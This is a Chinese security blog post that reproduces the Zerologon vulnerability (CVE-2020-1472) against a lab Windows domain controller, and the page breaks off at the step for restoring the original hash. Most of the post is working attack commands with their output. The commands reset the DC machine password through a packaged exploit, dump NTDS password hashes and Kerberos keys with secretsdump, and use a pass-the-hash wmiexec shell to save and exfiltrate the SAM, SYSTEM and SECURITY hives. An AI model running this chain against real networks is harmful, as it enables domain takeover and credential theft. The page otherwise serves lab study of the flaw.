<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>CVE-2020-1472复现 | Knsec         |       博观而约取 - 厚积而薄发</title>
  <meta name="keywords" content=" 漏洞复现 , DC , LADP , 389 , 内网 ">
  <meta name="description" content="CVE-2020-1472复现 | Knsec         |       博观而约取 - 厚积而薄发">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="安装.NET core https:&#x2F;&#x2F;www.microsoft.com&#x2F;net&#x2F;core#macos   测试dotnet new console  解决办法 ln -s &#x2F;usr&#x2F;local&#x2F;share&#x2F;dotnet&#x2F;dotnet &#x2F;usr&#x2F;local&#x2F;bin   dotnet run Vscode安装相应插件 创建json">
<meta property="og:type" content="article">
<meta property="og:title" content="MacOS利用vscode配置C#开发环境">
<meta property="og:url" content="http://knsec.github.io/2020/10/06/MacOS%E5%88%A9%E7%94%A8vscode%E9%85%8D%E7%BD%AEC-%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/index.html">
<meta property="og:site_name" content="Knsec         |       博观而约取 - 厚积而薄发">
<meta property="og:description" content="安装.NET core https:&#x2F;&#x2F;www.microsoft.com&#x2F;net&#x2F;core#macos   测试dotnet new console  解决办法 ln -s &#x2F;usr&#x2F;local&#x2F;share&#x2F;dotnet&#x2F;dotnet &#x2F;usr&#x2F;local&#x2F;bin   dotnet run Vscode安装相应插件 创建json">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://knsec.github.io/2020/10/06/images/image-1998988.png">
<meta property="og:image" content="http://knsec.github.io/2020/10/06/images/image-1998989.png">
<meta property="og:image" content="http://knsec.github.io/2020/10/06/images/image-1998990.png">
<meta property="og:image" content="http://knsec.github.io/2020/10/06/images/image-1998991.png">
<meta property="og:image" content="http://knsec.github.io/2020/10/06/images/image-1998992.png">
<meta property="og:image" content="http://knsec.github.io/2020/10/06/images/image-1998993.png">
<meta property="og:image" content="http://knsec.github.io/2020/10/06/images/image-1998994.png">
<meta property="article:published_time" content="2020-10-06T14:10:37.000Z">
<meta property="article:modified_time" content="2020-10-07T13:42:20.307Z">
<meta property="article:author" content="Knsec">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://knsec.github.io/2020/10/06/images/image-1998988.png">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.1.0" rel="stylesheet">

<link href="/css/hl_theme/atom-dark.css?v=1.1.0" rel="stylesheet">

<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">

<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="/js/titleTip.js?v=1.1.0" ></script>

<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>



<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>

<script src="/js/iconfont.js?v=1.1.0" ></script>

<meta name="generator" content="Hexo 4.2.1"></head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="">
  <input class="theme_blog_path" value="">
  <input id="theme_shortcut" value="true" />
</div>


<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/" class="avatar_target">
    <img class="avatar" src="/img/avatar.jpg" />
</a>
<div class="author">
    <span>Knsec</span>
</div>

<div class="icon">
    
        
    
        
        <a title="github" href="https://github.com/Knsec" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-github"></use>
                </svg>
            
        </a>
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
</div>




<ul>
    <li><div class="all active" data-rel="全部文章">全部文章<small>(21)</small></div></li>
    
        
            
            <li><div data-rel="tools">tools<small>(2)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="内网安全">内网安全<small>(1)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="手法技巧">手法技巧<small>(3)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="暂未公开">暂未公开<small>(3)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="杂记">杂记<small>(3)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="漏洞复现">漏洞复现<small>(2)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="环境配置">环境配置<small>(1)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="脚本">脚本<small>(3)</small></div>
                
            </li>
            
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
    
    
    
    
    </div>
    <div></div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="21">
<input type="hidden" id="yelog_site_word_count" value="10k">
<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        友情链接
        <i class="iconfont icon-left"></i>
    </div>
    <div class="friends-content">
        <ul>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <div class="right-top">
        <div id="default-panel">
            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
            <div class="right-title">全部文章</div>
            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
        </div>
        <div id="search-panel">
            <i class="iconfont icon-left" data-title="返回"></i>
            <input id="local-search-input" />
            <label class="border-line" for="input"></label>
            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
            <i class="iconfont icon-tag" data-title="标签"></i>
        </div>
        <div id="outline-panel" style="display: none">
            <div class="right-title">大纲</div>
            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
        </div>
    </div>

    <div class="tags-list">
    <input id="tag-search" />
    <div class="tag-wrapper">
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>389</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Centos7</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Centos7配置网络</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>DC</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Exchange</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>LADP</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Linux</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>python3</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>tools</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>vbs脚本</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>windows</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>其他</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>内网</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>内网安全学习</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>内网渗透</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>后门</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>域数据库</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>域渗透</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>工具</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>抓取密码</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>注册表</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>渗透技巧</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>漏洞复现</a>
            </li>
        
    </div>

</div>

    
    <nav id="title-list-nav">
        
        <a id="top" class="全部文章 内网安全 "
           href="/2020/07/17/Windows%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0%5B%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%5D/"
           data-tag="内网安全学习"
           data-author="" >
            <span class="post-title" title="Windows认证学习[持续更新]">Windows认证学习[持续更新]</span>
            <span class="post-date" title="2020-07-17 16:41:20">2020/07/17</span>
        </a>
        
        <a  class="全部文章 环境配置 "
           href="/2020/10/06/MacOS%E5%88%A9%E7%94%A8vscode%E9%85%8D%E7%BD%AEC-%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="MacOS利用vscode配置C#开发环境">MacOS利用vscode配置C#开发环境</span>
            <span class="post-date" title="2020-10-06 22:10:37">2020/10/06</span>
        </a>
        
        <a  class="全部文章 漏洞复现 "
           href="/2020/09/16/CVE-2020-1472%E5%A4%8D%E7%8E%B0/"
           data-tag="漏洞复现,DC,LADP,389,内网"
           data-author="" >
            <span class="post-title" title="CVE-2020-1472复现">CVE-2020-1472复现</span>
            <span class="post-date" title="2020-09-16 23:36:00">2020/09/16</span>
        </a>
        
        <a  class="全部文章 "
           href="/2020/08/19/%E8%A7%A3%E5%86%B3ntdsxtract%E6%97%A0%E6%B3%95%E5%88%86%E8%A7%A3win2016%E7%9A%84ntds/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="解决ntdsxtract无法分解win2016的ntds">解决ntdsxtract无法分解win2016的ntds</span>
            <span class="post-date" title="2020-08-19 23:28:28">2020/08/19</span>
        </a>
        
        <a  class="全部文章 脚本 "
           href="/2020/08/15/python3%E8%8E%B7%E5%8F%96%E8%AF%81%E4%B9%A6%E4%BF%A1%E6%81%AF/"
           data-tag="python3"
           data-author="" >
            <span class="post-title" title="python3获取证书信息">python3获取证书信息</span>
            <span class="post-date" title="2020-08-15 00:17:00">2020/08/15</span>
        </a>
        
        <a  class="全部文章 "
           href="/2020/07/20/chrome%E4%B8%ADhackbar%E7%A0%B4%E8%A7%A3/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="chrome中hackbar破解">chrome中hackbar破解</span>
            <span class="post-date" title="2020-07-20 09:59:30">2020/07/20</span>
        </a>
        
        <a  class="全部文章 手法技巧 "
           href="/2020/07/18/Win%E6%9A%B4%E5%8A%9B%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%90%8E%E9%97%A8/"
           data-tag="windows,注册表,后门"
           data-author="" >
            <span class="post-title" title="Win暴力注册表劫持后门">Win暴力注册表劫持后门</span>
            <span class="post-date" title="2020-07-18 13:14:19">2020/07/18</span>
        </a>
        
        <a  class="全部文章 手法技巧 "
           href="/2020/07/18/%E9%80%9A%E8%BF%87%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%85%B3%E9%97%ADWindows-Defender/"
           data-tag="windows"
           data-author="" >
            <span class="post-title" title="通过注册表关闭Windows_Defender">通过注册表关闭Windows_Defender</span>
            <span class="post-date" title="2020-07-18 12:57:43">2020/07/18</span>
        </a>
        
        <a  class="全部文章 暂未公开 "
           href="/2020/07/17/dump-ntds%E8%84%9A%E6%9C%AC/"
           data-tag="vbs脚本,域数据库,域渗透,内网渗透"
           data-author="" >
            <span class="post-title" title="dump_ntds脚本">dump_ntds脚本</span>
            <span class="post-date" title="2020-07-17 21:51:06">2020/07/17</span>
        </a>
        
        <a  class="全部文章 暂未公开 "
           href="/2020/07/17/windget%E8%8E%B7%E5%8F%96win%E5%AF%86%E7%A0%81%E5%85%8D%E6%9D%80/"
           data-tag="windows,工具,抓取密码"
           data-author="" >
            <span class="post-title" title="windget获取win密码免杀">windget获取win密码免杀</span>
            <span class="post-date" title="2020-07-17 21:04:56">2020/07/17</span>
        </a>
        
        <a  class="全部文章 脚本 "
           href="/2020/07/17/fofa-dump-python3/"
           data-tag="python3"
           data-author="" >
            <span class="post-title" title="fofa-dump_python3">fofa-dump_python3</span>
            <span class="post-date" title="2020-07-17 20:51:39">2020/07/17</span>
        </a>
        
        <a  class="全部文章 暂未公开 "
           href="/2020/07/17/password_h/"
           data-tag="windows,工具"
           data-author="" >
            <span class="post-title" title="password_h">password_h</span>
            <span class="post-date" title="2020-07-17 20:30:40">2020/07/17</span>
        </a>
        
        <a  class="全部文章 脚本 "
           href="/2020/07/17/python3%E8%8E%B7%E5%8F%96PDF%E5%9B%BE%E7%89%87%E4%B8%8E%E6%96%87%E5%AD%97/"
           data-tag="python3"
           data-author="" >
            <span class="post-title" title="python3获取PDF图片与文字">python3获取PDF图片与文字</span>
            <span class="post-date" title="2020-07-17 20:25:05">2020/07/17</span>
        </a>
        
        <a  class="全部文章 tools "
           href="/2020/07/17/win%E5%88%A9%E7%94%A8pwdump7%E5%AF%BC%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81/"
           data-tag="tools"
           data-author="" >
            <span class="post-title" title="win利用pwdump7导账户密码">win利用pwdump7导账户密码</span>
            <span class="post-date" title="2020-07-17 18:25:58">2020/07/17</span>
        </a>
        
        <a  class="全部文章 tools "
           href="/2020/07/17/%E5%88%A9%E7%94%A8Sqlck%E5%AF%B9SA%E7%88%86%E7%A0%B4/"
           data-tag="tools"
           data-author="" >
            <span class="post-title" title="利用Sqlck对SA爆破">利用Sqlck对SA爆破</span>
            <span class="post-date" title="2020-07-17 17:16:31">2020/07/17</span>
        </a>
        
        <a  class="全部文章 杂记 "
           href="/2020/07/09/Centos7%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE/"
           data-tag="Centos7,Centos7配置网络"
           data-author="" >
            <span class="post-title" title="Centos7初始化配置">Centos7初始化配置</span>
            <span class="post-date" title="2020-07-09 20:35:53">2020/07/09</span>
        </a>
        
        <a  class="全部文章 手法技巧 "
           href="/2020/07/09/Linux%E5%88%A9%E7%94%A8%E5%88%AB%E5%90%8D%E6%8A%93%E5%8F%96%E8%B4%A6%E6%88%B7%E5%88%87%E6%8D%A2%E6%97%B6%E5%AF%86%E7%A0%81/"
           data-tag="Linux,渗透技巧"
           data-author="" >
            <span class="post-title" title="Linux利用别名抓取账户切换时密码">Linux利用别名抓取账户切换时密码</span>
            <span class="post-date" title="2020-07-09 20:08:23">2020/07/09</span>
        </a>
        
        <a  class="全部文章 漏洞复现 "
           href="/2020/07/09/ExchangeServer-CVE-2020-0688%E5%A4%8D%E7%8E%B0/"
           data-tag="漏洞复现,内网,Exchange"
           data-author="" >
            <span class="post-title" title="ExchangeServer CVE-2020-0688复现">ExchangeServer CVE-2020-0688复现</span>
            <span class="post-date" title="2020-07-09 12:11:00">2020/07/09</span>
        </a>
        
        <a  class="全部文章 杂记 "
           href="/2020/07/09/%E4%BB%A5%E8%BE%83%E5%BF%AB%E7%9A%84%E9%80%9F%E5%BA%A6%E8%AE%BF%E9%97%AEGithub/"
           data-tag="其他"
           data-author="" >
            <span class="post-title" title="以较快的速度访问Github">以较快的速度访问Github</span>
            <span class="post-date" title="2020-07-09 11:19:12">2020/07/09</span>
        </a>
        
        <a  class="全部文章 杂记 "
           href="/2020/07/09/%E8%AE%B0%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%A2%B0%E5%88%B0%E7%9A%84%E5%9D%91/"
           data-tag="其他"
           data-author="" >
            <span class="post-title" title="记搭建博客碰到的坑">记搭建博客碰到的坑</span>
            <span class="post-date" title="2020-07-09 11:04:00">2020/07/09</span>
        </a>
        
        <a  class="全部文章 "
           href="/2020/07/08/Git%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/"
           data-tag="其他"
           data-author="" >
            <span class="post-title" title="Git基本用法">Git基本用法</span>
            <span class="post-date" title="2020-07-08 23:40:16">2020/07/08</span>
        </a>
        
        <div id="no-item-tips">

        </div>
    </nav>
    <div id="outline-list">
    </div>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle" data-title="切换全屏 快捷键 s">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div id="post">
    <div class="pjax">
        <article id="post-CVE-2020-1472复现" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">CVE-2020-1472复现</h1>
    
    <div class="article-meta">
        
        
        
        <span class="book">
            <i class="iconfont icon-category"></i>
            
            
            <a  data-rel="漏洞复现">漏洞复现</a>
            
        </span>
        
        
        <span class="tag">
            <i class="iconfont icon-tag"></i>
            
            <a class="color5">漏洞复现</a>
            
            <a class="color3">DC</a>
            
            <a class="color5">LADP</a>
            
            <a class="color4">389</a>
            
            <a class="color3">内网</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
            发布时间 : <time class="date" title='最后更新: 2020-09-17 14:09:10'>2020-09-16 23:36</time>
        
    </div>
    <div class="article-meta">
        
        <span>字数:1.9k</span>
        
        
        <span id="busuanzi_container_page_pv">
            阅读 :<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞描述"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#影响版本"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境交代"><span class="toc-text">环境交代</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安装impacket"><span class="toc-text">安装impacket</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用条件及注意说明"><span class="toc-text">利用条件及注意说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用过程"><span class="toc-text">利用过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#获取管理员ntlm-hash"><span class="toc-text">获取管理员ntlm hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取域控shell和导出域控计算机账户的原始NT-hash"><span class="toc-text">获取域控shell和导出域控计算机账户的原始NT hash</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SHELL导出域控计算机账户注册表文件"><span class="toc-text">SHELL导出域控计算机账户注册表文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#本地获取dc计算机账户原始NT-HASH"><span class="toc-text">本地获取dc计算机账户原始NT HASH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#恢复原来DC的HASH"><span class="toc-text">恢复原来DC的HASH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#测试是否恢复成功"><span class="toc-text">测试是否恢复成功</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#修改cve-2020-1472-exploit源码"><span class="toc-text">修改cve-2020-1472-exploit源码</span></a></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><hr>
<pre><code>2020年08月12日， 360CERT监测发现Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏洞评分：10分。
攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序。</code></pre><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><hr>
<pre><code>Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Windows Server 2016
Windows Server 2016 (Server Core installation)
Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation)
Windows Server, version 2004 (Server Core installation)</code></pre><h2 id="环境交代"><a href="#环境交代" class="headerlink" title="环境交代"></a>环境交代</h2><hr>
<pre><code>DC:
win2012 r2
192.168.1.12
PC:
win2019
192.168.1.111</code></pre><h2 id="安装impacket"><a href="#安装impacket" class="headerlink" title="安装impacket"></a>安装impacket</h2><hr>
<pre><code>git clone https://github.com/SecureAuthCorp/impacket
cd impacket
pip install .
cd example</code></pre><h2 id="利用条件及注意说明"><a href="#利用条件及注意说明" class="headerlink" title="利用条件及注意说明"></a>利用条件及注意说明</h2><hr>
<ul>
<li>需要在域内</li>
<li>因是python打包成exe，文件稍大。</li>
<li>经测试，在成员机在win7系统下无法运行exe</li>
</ul>
<p><img src="/../images/image-20200916211223363.png" alt="image-20200916211223363"></p>
<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><hr>
<pre><code>C:\&gt;cve-2020-1472-exploit.exe
Usage: zerologon_tester.py &lt;dc-name&gt; &lt;dc-ip&gt;

Tests whether a domain controller is vulnerable to the Zerologon attack. Resets the DC account password to an empty string when vulnerable.
Note: dc-name should be the (NetBIOS) computer name of the domain controller.

C:\&gt;cve-2020-1472-exploit.exe dc 192.168.1.12
Performing authentication attempts...
=================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!</code></pre><pre><code>secretsdump.exe knsec.com/dc$@192.168.1.12 -no-pass 参数说明
-no-pass    无密码登录
-just-dc    仅提取NTDS.DIT数据(即NYLM hash与Kerberos)
如果在Linux使用时，需要把$进行转义，在windows下不需要</code></pre><h3 id="获取管理员ntlm-hash"><a href="#获取管理员ntlm-hash" class="headerlink" title="获取管理员ntlm hash"></a>获取管理员ntlm hash</h3><hr>
<pre><code>C:\&gt;secretsdump.exe knsec.com/dc$@192.168.1.12 -no-pass
Cannot determine Impacket version. If running from source you should at least run &quot;python setup.py egg_info&quot;
Impacket v? - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2d62adb84ec378d2ecea10e567bc9417:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5cc55a62ee304fa491446e2d0990d2ca:::
knsec.com\kntest:1106:aad3b435b51404eeaad3b435b51404ee:47bf8039a8506cd67c524a03ff84ba4e:::
DC$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
PC1$:1104:aad3b435b51404eeaad3b435b51404ee:aa5ad52d3454baf9d0a526cbbae5532a:::
PC$:1105:aad3b435b51404eeaad3b435b51404ee:f9d8a86bf2393caf560d9cc78ea455a8:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:da6b7a6b8eb7c88bb4566483d6d82f619a4f90231169bda43566ecf816894717
krbtgt:aes128-cts-hmac-sha1-96:f170b8aeeb767bc573dcbd7068bcf7c5
krbtgt:des-cbc-md5:6bfe754c31544c4a
knsec.com\kntest:aes256-cts-hmac-sha1-96:6adedeb34bffea0fa15acbf899693e3a092bba7dbdb55b256adc7b5e642060ad
knsec.com\kntest:aes128-cts-hmac-sha1-96:26b3d4a26ba6b15e22f1a3224f50bfd6
knsec.com\kntest:des-cbc-md5:899d6d8a70294668
DC$:aes256-cts-hmac-sha1-96:db91e3db8b833c8ac51b3517c2556ed8c24f5f77933c3ed94f2ac5ef9437cfe0
DC$:aes128-cts-hmac-sha1-96:7882426f4b56c57b03a8bc40c909e904
DC$:des-cbc-md5:7c45aed0b90ec8fe
PC1$:aes256-cts-hmac-sha1-96:9704d3f427831f3c13a231ff6f317c1661e0d942cc478510be070a72b6e985f4
PC1$:aes128-cts-hmac-sha1-96:785f5717ba439cf2be35659b9776fc4c
PC1$:des-cbc-md5:01e9402f6451a894
PC$:aes256-cts-hmac-sha1-96:82d914a9ec6d6ee2e706133dce62e7ca5a87295ceb5fb0b11a2ea4f813fc6773
PC$:aes128-cts-hmac-sha1-96:e7a06cba47388253552e67459c8d6e3a
PC$:des-cbc-md5:13a2c2d67f159bbc
[*] Cleaning up...</code></pre><h2 id="获取域控shell和导出域控计算机账户的原始NT-hash"><a href="#获取域控shell和导出域控计算机账户的原始NT-hash" class="headerlink" title="获取域控shell和导出域控计算机账户的原始NT hash"></a>获取域控shell和导出域控计算机账户的原始NT hash</h2><hr>
<pre><code>wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:2d62adb84ec378d2ecea10e567bc9417 knsec.com/administrator@192.168.1.12  参数说明

wmiexec.exe -hashes 域管理员nthash:lmhash</code></pre><pre><code>C:\&gt;wmiexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:2d62adb84ec378d2ecea10e567bc9417 knsec.com/administrator@192.168.1.12
Cannot determine Impacket version. If running from source you should at least run &quot;python setup.py egg_info&quot;
Impacket v? - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\&gt;reg save HKLM\SYSTEM system.save
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute wmiexec.py again with -codec and the corresponding codec
�����ɹ���ɡ�

C:\&gt;reg save HKLM\SAM sam.save
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute wmiexec.py again with -codec and the corresponding codec
�����ɹ���ɡ�

C:\&gt;reg save HKLM\SECURITY security.save
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute wmiexec.py again with -codec and the corresponding codec
�����ɹ���ɡ�

C:\&gt;get system.save
[*] Downloading C:\\system.save
C:\&gt;get sam.save
[*] Downloading C:\\sam.save
C:\&gt;get security.save
[*] Downloading C:\\security.save
C:\&gt;del /f system.save

C:\&gt;del /f sam.save

C:\&gt;del /f security.save

C:\&gt;exit</code></pre><h3 id="SHELL导出域控计算机账户注册表文件"><a href="#SHELL导出域控计算机账户注册表文件" class="headerlink" title="SHELL导出域控计算机账户注册表文件"></a>SHELL导出域控计算机账户注册表文件</h3><hr>
<pre><code class="powershell">reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save

get system.save
get sam.save
get security.save

del /f system.save
del /f sam.save
del /f security.save</code></pre>
<h3 id="本地获取dc计算机账户原始NT-HASH"><a href="#本地获取dc计算机账户原始NT-HASH" class="headerlink" title="本地获取dc计算机账户原始NT HASH"></a>本地获取dc计算机账户原始NT HASH</h3><hr>
<pre><code>C:\&gt;secretsdump.exe -sam sam.save -system system.save -security security.save LOCAL
Cannot determine Impacket version. If running from source you should at least run &quot;python setup.py egg_info&quot;
Impacket v? - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xf782775e13dd757c9c7fc639a2a30dde
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d87f71136a5365a853a430f3a4bb97d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:cc82ae2dcf9e5b8e4b8468c439d4d4babaab37f8fc505a4c5c0516c69d9d6981b0e47794d62ea3ca3421a6c08c9283d2d462a5c433ee609c5d9bb1ea0bfc30adff826400309b83bbc5290b5a14859c7e39b2cc150441540eaa256bb28cec0d3693a5a7977aa61800289bb1f5e8b4b5746a5472f71524bf391626c7d472c29119b91232abde9c58c44d8c2ed199db06166cf85ffb81372ee48a29cb2e7c1f966b63a39e5162c4b466ecbce5ff0a5147fcbcef2b93d504e3bb0a070fe0c17314ff0d5ca6eab46d4c610c89fde6da1bc863e4ea68e041d32670afa6d01e8bb179262c7c6cd36fce8cbb7d8f14bf04eeecca
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:007c55bf5537e288d94259220c87f18c
[*] DPAPI_SYSTEM
dpapi_machinekey:0x0b96f071d54d6ebee95d5a3bb46444be415ec9cb
dpapi_userkey:0x40c3ee5608b387e3220d39b0a1e1a03e3f870f67
[*] NL$KM
 0000   FD D6 57 D5 4E 8F 15 C3  22 5B 76 67 76 2D C6 B6   ..W.N...&quot;[vgv-..
 0010   D7 DA 73 99 40 2D 1D D7  45 74 14 07 B0 C7 F1 99   ..s.@-..Et......
 0020   C7 FE F8 4D 56 13 3B 48  FD C3 DB 66 84 95 4E AA   ...MV.;H...f..N.
 0030   FC 9E 10 C6 95 C6 2F 19  87 C9 EB 4F 7E 21 3F 2D   ....../....O~!?-
NL$KM:fdd657d54e8f15c3225b7667762dc6b6d7da7399402d1dd745741407b0c7f199c7fef84d56133b48fdc3db6684954eaafc9e10c695c62f1987c9eb4f7e213f2d
[*] Cleaning up...</code></pre><h3 id="恢复原来DC的HASH"><a href="#恢复原来DC的HASH" class="headerlink" title="恢复原来DC的HASH"></a>恢复原来DC的HASH</h3><hr>
